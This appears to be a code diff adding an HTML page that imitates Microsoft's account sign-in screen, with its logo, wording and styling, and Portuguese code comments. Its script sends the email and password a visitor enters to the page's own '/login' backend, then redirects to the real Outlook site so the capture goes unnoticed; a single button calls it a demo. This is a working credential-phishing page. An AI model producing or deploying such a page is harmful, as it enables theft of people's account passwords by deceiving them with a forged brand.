@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 440px;
+            padding: 20px;
+        }
+
+        .login-box {
+            background: white;
+            border-radius: 4px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
+            padding: 50px 40px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            width: 100px;
+            height: auto;
+        }
+
+        .title {
+            font-size: 17px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .subtitle {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #000;
+            margin-bottom: 8px;
+        }
+
+        input[type="email"],
+        input[type="password"],
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+            font-family: inherit;
+            transition: border-color 0.2s;
+        }
+
+        input[type="email"]:focus,
+        input[type="password"]:focus,
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #0078d4;
+            box-shadow: 0 0 0 1px rgba(0, 120, 212, 0.1);
+        }
+
+        .error-message {
+            color: #a4373a;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .sign-in-button {
+            width: 100%;
+            padding: 12px;
+            background: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-bottom: 20px;
+        }
+
+        .sign-in-button:hover {
+            background: #106ebe;
+        }
+
+        .sign-in-button:active {
+            background: #005a9e;
+        }
+
+        .sign-in-button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .options {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+
+        .options a {
+            color: #0078d4;
+            text-decoration: none;
+        }
+
+        .options a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 13px;
+            color: #666;
+        }
+
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .footer a {
+            color: #0078d4;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .button-content {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <img src="https://thumb.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/960px-Microsoft_logo_%282012%29.svg.png" alt="Microsoft">
+            </div>
+
+            <h1 class="title">Sign in</h1>
+            <p class="subtitle">to your Microsoft account</p>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="email">Email, phone, or Skype</label>
+                    <input
+                        type="email"
+                        id="email"
+                        name="email"
+                        placeholder="someone@example.com"
+                        required
+                    >
+                    <div class="error-message" id="emailError"></div>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input
+                        type="password"
+                        id="password"
+                        name="password"
+                        placeholder="Password"
+                        required
+                    >
+                    <div class="error-message" id="passwordError"></div>
+                </div>
+
+                <div class="options">
+                    <label>
+                        <input type="checkbox" name="remember" value="true">
+                        Keep me signed in
+                    </label>
+                    <a href="#">Can't access your account?</a>
+                </div>
+
+                <button type="submit" class="sign-in-button" id="submitBtn">
+                    <div class="button-content">
+                        <span id="buttonText">Sign in</span>
+                        <div class="spinner" id="spinner"></div>
+                    </div>
+                </button>
+
+                <div id="errorAlert" class="error-message" style="display: none; text-align: center;"></div>
+            </form>
+
+            <div class="divider">or</div>
+
+            <button class="sign-in-button" style="background: #f5f5f5; color: #000; border: 1px solid #ccc;" onclick="alert('This is just a demo')">
+                Create one!
+            </button>
+
+            <div class="footer">
+                <a href="#">Privacy & Cookies</a>
+                <a href="#">Legal</a>
+                <a href="#">Contact us</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const submitBtn = document.getElementById('submitBtn');
+        const spinner = document.getElementById('spinner');
+        const buttonText = document.getElementById('buttonText');
+        const errorAlert = document.getElementById('errorAlert');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            // Validação básica
+            if (!emailInput.value.trim()) {
+                showError('emailError', 'Email address is required');
+                return;
+            }
+
+            if (!passwordInput.value.trim()) {
+                showError('passwordError', 'Password is required');
+                return;
+            }
+
+            // Limpar erros anteriores
+            clearErrors();
+
+            // Desabilitar botão e mostrar spinner
+            submitBtn.disabled = true;
+            spinner.style.display = 'block';
+            buttonText.style.display = 'none';
+
+            try {
+                // Enviar credenciais ao backend
+                const response = await fetch('/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: emailInput.value,
+                        password: passwordInput.value,
+                        remember: document.querySelector('input[name="remember"]:checked') ? true : false
+                    })
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    // Simular redirecionamento bem-sucedido
+                    errorAlert.style.display = 'block';
+                    errorAlert.textContent = 'Login successful! Redirecting...';
+                    errorAlert.style.color = '#107C10';
+
+                    setTimeout(() => {
+                        window.location.href = 'https://outlook.office.com';
+                    }, 2000);
+                } else {
+                    // Erro de autenticação
+                    showErrorAlert(data.message || 'Invalid credentials. Please try again.');
+                    submitBtn.disabled = false;
+                    spinner.style.display = 'none';
+                    buttonText.style.display = 'inline';
+                    passwordInput.value = '';
+                    passwordInput.focus();
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showErrorAlert('An error occurred. Please try again later.');
+                submitBtn.disabled = false;
+                spinner.style.display = 'none';
+                buttonText.style.display = 'inline';
+            }
+        });
+
+        function showError(elementId, message) {
+            const errorEl = document.getElementById(elementId);
+            errorEl.textContent = message;
+            errorEl.classList.add('show');
+        }
+
+        function clearErrors() {
+            document.querySelectorAll('.error-message').forEach(el => {
+                el.classList.remove('show');
+                el.textContent = '';
+            });
+        }
+
+        function showErrorAlert(message) {
+            errorAlert.style.display = 'block';
+            errorAlert.textContent = message;
+            errorAlert.style.color = '#a4373a';
+        }
+
+        // Limpar erros ao digitar
+        emailInput.addEventListener('input', () => {
+            document.getElementById('emailError').classList.remove('show');
+        });
+
+        passwordInput.addEventListener('input', () => {
+            document.getElementById('passwordError').classList.remove('show');
+        });
+    </script>
+</body>
+</html>
